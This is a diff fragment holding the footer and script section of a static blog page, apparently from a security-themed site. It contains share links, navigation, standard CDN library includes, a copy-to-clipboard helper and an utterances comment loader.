+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://www.hack0day.net/2022/07/30/APT-AttckForWork/&t=APT - AttckForWork"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2022
+    Attck
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Articles</a></li><!--
+     --><!--
+       --><li><a target="_blank" rel="noopener" href="https://github.com/Attckforwork/">Github</a></li><!--
+     --><!--
+       --><li><a href="/atom.xml">Rss</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.2/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+ 
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script> 
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script> 
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="far fa-clone"></i>';
+    btn += '</span>'; 
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Google Analytics -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Umami Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+    <script type="text/javascript">
+      var utterances_repo = 'Attckforwork/blog-comment';
+      var utterances_issue_term = 'pathname';
+      var utterances_label = 'Comment';
+      var utterances_theme = 'github-dark';
+
+      (function(){
+          var script = document.createElement('script');
+
+          script.src = 'https://utteranc.es/client.js';
+          script.setAttribute('repo', utterances_repo);
+          script.setAttribute('issue-term', 'pathname');
+          script.setAttribute('label', utterances_label);
+          script.setAttribute('theme', utterances_theme);
+          script.setAttribute('crossorigin', 'anonymous');
+          script.async = true;
+          (document.getElementById('utterances_thread')).appendChild(script);
+      }());
+  </script>
+
+</body>
+</html>
